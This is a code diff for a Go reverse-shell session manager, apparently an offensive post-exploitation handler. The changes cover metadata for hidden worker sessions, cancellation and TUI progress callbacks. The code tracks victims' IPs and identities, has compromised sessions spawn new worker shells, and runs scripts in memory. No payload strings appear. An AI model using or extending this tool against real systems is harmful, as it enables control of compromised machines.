@@ -143,47 +143,51 @@ func resolveRevAction(gen *ReverseShellGenerator, mode, target string) (revActio
 
 // Manager gerencia múltiplas sessões de reverse shell
 type Manager struct {
-	sessions             map[string]*SessionInfo         // Mapa de sessões ativas
-	mu                   sync.RWMutex                    // Proteção concorrente
-	nextID               int                             // Próximo ID numérico
-	activeConn           net.Conn                        // Conexão atualmente ativa (se houver)
-	selectedSession      *SessionInfo                    // Sessão selecionada (mas não necessariamente ativa)
-	menuActive           bool                            // Se estamos no menu principal
-	silent               bool                            // Suppress console output (TUI mode)
-	hasCreatedLogs       bool                            // Whether this instance created any session logs
-	notifyTUI            func(string)                    // Callback to send messages to TUI output pane
-	notifyBar            func(string, int)               // Callback for notification bar overlay (msg, level)
-	spinnerStart         func(int, string)               // Start spinner in TUI (id, text)
-	spinnerStop          func(int)                       // Stop spinner in TUI (id)
-	spinnerUpdate        func(int, string)               // Update spinner text in TUI (id, text)
-	nextSpinnerID        int                             // Auto-incrementing spinner ID
-	transferProgressFunc func(string, int, string, bool) // Callback for transfer progress (filename, pct, right, upload)
-	transferDoneFunc     func(string, bool, error)       // Callback for transfer completion (filename, upload, error)
-	shellOutputFunc      func(string, int, []byte)       // Callback for shell relay output (sessionID, numID, data)
-	sessionDisconnFunc   func(int, string)               // Callback for session disconnect (numID, remoteIP)
-	relaySuppressNano    atomic.Int64                    // UnixNano of last stty resize (atomic for goroutine safety)
-	pendingWorker        atomic.Bool                     // Next AddSession will be a hidden worker
-	pendingSSH           atomic.Bool                     // Next AddSession will be an SSH session
-	listenerIP           string                          // IP do listener para geração de payloads
-	listenerPort         int                             // Porta do listener para geração de payloads
+	sessions              map[string]*SessionInfo         // Mapa de sessões ativas
+	mu                    sync.RWMutex                    // Proteção concorrente
+	nextID                int                             // Próximo ID numérico
+	activeConn            net.Conn                        // Conexão atualmente ativa (se houver)
+	selectedSession       *SessionInfo                    // Sessão selecionada (mas não necessariamente ativa)
+	menuActive            bool                            // Se estamos no menu principal
+	silent                bool                            // Suppress console output (TUI mode)
+	hasCreatedLogs        bool                            // Whether this instance created any session logs
+	notifyTUI             func(string)                    // Callback to send messages to TUI output pane
+	notifyBar             func(string, int)               // Callback for notification bar overlay (msg, level)
+	spinnerStart          func(int, string)               // Start spinner in TUI (id, text)
+	spinnerStop           func(int)                       // Stop spinner in TUI (id)
+	spinnerUpdate         func(int, string)               // Update spinner text in TUI (id, text)
+	nextSpinnerID         int                             // Auto-incrementing spinner ID
+	transferProgressFunc  func(string, int, string, bool) // Callback for transfer progress (filename, pct, right, upload)
+	transferDoneFunc      func(string, bool, error)       // Callback for transfer completion (filename, upload, error)
+	shellOutputFunc       func(string, int, []byte)       // Callback for shell relay output (sessionID, numID, data)
+	sessionDisconnFunc    func(int, string)               // Callback for session disconnect (numID, remoteIP)
+	relaySuppressNano     atomic.Int64                    // UnixNano of last stty resize (atomic for goroutine safety)
+	pendingWorker         atomic.Bool                     // Next AddSession will be a hidden worker
+	pendingWorkerPlatform string                          // Parent platform inherited by next worker session
+	pendingWorkerWhoami   string                          // Parent identity inherited by next worker session
+	pendingSSH            atomic.Bool                     // Next AddSession will be an SSH session
+	listenerIP            string                          // IP do listener para geração de payloads
+	listenerPort          int                             // Porta do listener para geração de payloads
 }
 
 // SessionInfo contém informações sobre uma sessão
 type SessionInfo struct {
-	ID          string             // ID único da sessão (hex)
-	NumID       int                // ID numérico para facilitar uso
-	Conn        net.Conn           // Conexão TCP
-	RemoteIP    string             // IP da vítima
-	Whoami      string             // user@host da vítima
-	Platform    string             // Plataforma (linux/windows/unknown)
-	ShellFlavor string             // Shell implementation hint (powershell, csharp, etc.)
-	Handler     *Handler           // Shell handler
-	Active      bool               // Se está sendo usada atualmente
-	CreatedAt   time.Time          // Timestamp de criação
-	LogFile     *os.File           // Session I/O log file (lazy init)
-	relayCancel context.CancelFunc // Cancel function for TUI relay goroutine
-	relayActive bool               // Whether relay goroutine is running
-	isWorker    bool               // Hidden worker session (module execution)
+	ID               string             // ID único da sessão (hex)
+	NumID            int                // ID numérico para facilitar uso
+	Conn             net.Conn           // Conexão TCP
+	RemoteIP         string             // IP da vítima
+	Whoami           string             // user@host da vítima
+	Platform         string             // Plataforma (linux/windows/unknown)
+	ShellFlavor      string             // Shell implementation hint (powershell, csharp, etc.)
+	Handler          *Handler           // Shell handler
+	Active           bool               // Se está sendo usada atualmente
+	CreatedAt        time.Time          // Timestamp de criação
+	LogFile          *os.File           // Session I/O log file (lazy init)
+	relayCancel      context.CancelFunc // Cancel function for TUI relay goroutine
+	relayActive      bool               // Whether relay goroutine is running
+	isWorker         bool               // Hidden worker session (module execution)
+	transferProgress func(string)       // Optional TUI progress callback for worker transfers
+	transferDone     func()             // Optional TUI completion callback for worker transfers
 }
 
 func (m *Manager) nextVisibleSessionID(isWorker bool) int {
@@ -208,11 +212,32 @@ func findNewestWorkerSession(sessions map[string]*SessionInfo) *SessionInfo {
 	return newest
 }
 
-func resolveWorkerPlatform(workerPlatform, parentPlatform string) string {
-	if workerPlatform == "detecting..." || workerPlatform == "unknown" || workerPlatform == "" {
-		return parentPlatform
+func (m *Manager) setPendingWorkerMetadata(parent *SessionInfo) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	if parent == nil {
+		m.pendingWorkerPlatform = "unknown"
+		m.pendingWorkerWhoami = "unknown"
+		return
 	}
-	return workerPlatform
+	m.pendingWorkerPlatform = parent.Platform
+	m.pendingWorkerWhoami = parent.Whoami
+}
+
+func (m *Manager) consumePendingWorkerMetadata() (platform, whoami string) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	platform = m.pendingWorkerPlatform
+	whoami = m.pendingWorkerWhoami
+	m.pendingWorkerPlatform = ""
+	m.pendingWorkerWhoami = ""
+	if platform == "" || platform == "detecting..." {
+		platform = "unknown"
+	}
+	if whoami == "" || whoami == "detecting..." {
+		whoami = "unknown"
+	}
+	return platform, whoami
 }
 
 func shouldUseWorkerForSpawn(platform string) bool {
@@ -246,6 +271,17 @@ func (s *SessionInfo) Directory() string {
 func (s *SessionInfo) newTransferer() *Transferer {
 	t := NewTransferer(s.Conn, s.ID)
 	t.SetPlatform(s.Platform)
+	if s.isWorker {
+		// Worker sessions do not run the normal PTY/relay path, so transfers need
+		// conservative chunking and must not print CLI spinners into the TUI.
+		t.ptyUpgraded = true
+		if s.transferProgress != nil {
+			t.progressFn = s.transferProgress
+		} else {
+			t.progressFn = func(string) {}
+		}
+		t.doneFn = s.transferDone
+	}
 	return t
 }
 
@@ -395,7 +431,7 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 	} else {
 		// B64: upload to variable, then execute
 		varName := fmt.Sprintf("_flame_script_%d", time.Now().UnixNano())
-		if err := t.UploadToBashVariable(context.Background(), localPath, varName); err != nil {
+		if err := t.UploadToBashVariable(ctx, localPath, varName); err != nil {
 			if cleanup != nil {
 				cleanup()
 			}
@@ -1402,6 +1438,35 @@ func extractPercent(text string) int {
 	return pct
 }
 
+func parseTransferProgressText(text string) (label, right string, pct int) {
+	pct = extractPercent(text)
+	label = strings.TrimSpace(text)
+	right = ""
+
+	if idx := strings.Index(text, "..."); idx >= 0 {
+		prefix := strings.TrimSpace(text[:idx])
+		suffix := strings.TrimSpace(text[idx+3:])
+		switch {
+		case strings.HasPrefix(prefix, "Uploading "):
+			label = strings.TrimPrefix(prefix, "Uploading ")
+		case strings.HasPrefix(prefix, "Downloading "):
+			label = strings.TrimPrefix(prefix, "Downloading ")
+		case strings.HasPrefix(prefix, "Loading "):
+			label = strings.TrimPrefix(prefix, "Loading ")
+		default:
+			label = prefix
+		}
+		right = suffix
+		if pct >= 0 {
+			if pctIdx := strings.LastIndex(right, "("); pctIdx > 0 {
+				right = strings.TrimSpace(right[:pctIdx])
+			}
+		}
+	}
+
+	return displayTransferName(label), right, pct
+}
+
 // isSttyEcho returns true if a chunk of shell output looks like stty resize
 // echo and/or a bare prompt (no real user content). Used to suppress the
 // visual noise from PTY resize commands.
@@ -1517,13 +1582,27 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.mu.Lock()
 	isWorker := m.pendingWorker.CompareAndSwap(true, false)
 	isSSH := m.pendingSSH.CompareAndSwap(true, false)
+	workerPlatform := "detecting..."
+	workerWhoami := "detecting..."
+	if isWorker {
+		workerPlatform = m.pendingWorkerPlatform
+		workerWhoami = m.pendingWorkerWhoami
+		m.pendingWorkerPlatform = ""
+		m.pendingWorkerWhoami = ""
+		if workerPlatform == "" || workerPlatform == "detecting..." {
+			workerPlatform = "unknown"
+		}
+		if workerWhoami == "" || workerWhoami == "detecting..." {
+			workerWhoami = "unknown"
+		}
+	}
 	session := &SessionInfo{
 		ID:          id,
 		NumID:       m.nextVisibleSessionID(isWorker),
 		Conn:        conn,
 		RemoteIP:    remoteIP,
-		Whoami:      "detecting...",
-		Platform:    "detecting...",
+		Whoami:      workerWhoami,
+		Platform:    workerPlatform,
 		ShellFlavor: "unknown",
 		Handler:     handler,
 		Active:      false,
@@ -1541,16 +1620,6 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.mu.Unlock()
 
 	if session.isWorker {
-		// Worker: silent detection, no notifications, no spinner, no stdout
-		old := os.Stdout
-		oldErr := os.Stderr
-		devnull, _ := os.Open(os.DevNull)
-		os.Stdout = devnull
-		os.Stderr = devnull
-		m.detectSessionInfo(session)
-		os.Stdout = old
-		os.Stderr = oldErr
-		devnull.Close()
 		handler.SetPlatform(session.Platform)
 	} else {
 		// Normal session: full notifications
@@ -1841,7 +1910,7 @@ func (m *Manager) handleRunModule(moduleName string, args []string) {
 
 // StartModule runs a module asynchronously with TUI spinner.
 // Stops relay for exclusive conn access, opens terminal for output.
-func (m *Manager) StartModule(moduleName string, args []string) {
+func (m *Manager) StartModule(ctx context.Context, moduleName string, args []string) {
 	m.mu.RLock()
 	session := m.selectedSession
 	m.mu.RUnlock()
@@ -1865,6 +1934,12 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 	spinID := m.startSpinner(fmt.Sprintf("Spawning worker shell for %s...", moduleName))
 
 	go func() {
+		defer func() {
+			if m.transferDoneFunc != nil {
+				m.transferDoneFunc("", true, nil)
+			}
+		}()
+
 		// Like Penelope: spawn a NEW session to run the module.
 		// The main session stays free for shell interaction.
 		spawnIP := GlobalRuntimeConfig.GetPivotIP()
@@ -1902,6 +1977,7 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		}
 
 		initialCount := m.getAllSessionCount()
+		m.setPendingWorkerMetadata(session)
 		m.pendingWorker.Store(true) // Next AddSession will be marked as worker
 		session.Conn.Write([]byte(payload))
 
@@ -1913,6 +1989,12 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		// Wait for worker session to connect (max 10s)
 		var workerSession *SessionInfo
 		for i := 0; i < 50; i++ {
+			select {
+			case <-ctx.Done():
+				m.stopSpinner(spinID)
+				return
+			default:
+			}
 			time.Sleep(200 * time.Millisecond)
 			if m.getAllSessionCount() > initialCount {
 				// Find the newest worker session explicitly. Workers no longer consume
@@ -1933,14 +2015,29 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 			return
 		}
 
-		// Wait for worker detection (platform needed for module execution)
-		for i := 0; i < 20; i++ {
-			if workerSession.Platform != "detecting..." {
-				break
+		moduleTransferSpinID := 0
+		workerSession.transferProgress = func(text string) {
+			if moduleTransferSpinID == 0 {
+				moduleTransferSpinID = m.startSpinner(text)
+			} else if m.spinnerUpdate != nil {
+				m.spinnerUpdate(moduleTransferSpinID, text)
 			}
-			time.Sleep(500 * time.Millisecond)
+			if m.transferProgressFunc != nil {
+				label, right, pct := parseTransferProgressText(text)
+				if pct >= 0 {
+					m.transferProgressFunc(label, pct, right, true)
+				}
+			}
 		}
-		workerSession.Platform = resolveWorkerPlatform(workerSession.Platform, session.Platform)
+		workerSession.transferDone = func() {
+			if moduleTransferSpinID != 0 {
+				m.stopSpinner(moduleTransferSpinID)
+				moduleTransferSpinID = 0
+			}
+			if m.transferProgressFunc != nil {
+				m.transferProgressFunc("", -1, "", true)
+			}
+		}
 
 		// Stop spinner — module is launching, user can continue working
 		m.stopSpinner(spinID)
@@ -1952,7 +2049,7 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 		old := os.Stdout
 		devnull, _ := os.Open(os.DevNull)
 		os.Stdout = devnull
-		err := module.Run(context.Background(), workerSession, args)
+		err := module.Run(ctx, workerSession, args)
 		os.Stdout = old
 		devnull.Close()
 
